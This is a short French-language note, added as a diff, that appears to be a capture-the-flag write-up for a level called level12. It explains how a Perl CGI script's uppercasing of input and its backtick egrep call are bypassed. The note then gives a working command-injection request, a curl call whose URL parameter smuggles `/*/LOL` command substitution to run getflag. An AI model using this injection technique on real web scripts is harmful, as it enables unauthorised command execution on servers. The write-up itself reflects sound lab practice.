@@ -1,0 +1,9 @@
+Inspect script perl
+regexp `$xx =~ tr/a-z/A-Z/;" == les mins sont remplacees par des majs
+
+`@output = `egrep "^$xx" /tmp/xd 2>&1`;`
+=> va faire matcher la regex de la variable du script $xx
+
+On cree donc un fichier en maj LOL dans le dossier tmp, on le chmod 777
+et on execute la commande suivante pour executer `getflag` a travers l'url
+` curl localhost:4646/level12.pl?x='`/*/LOL`' `
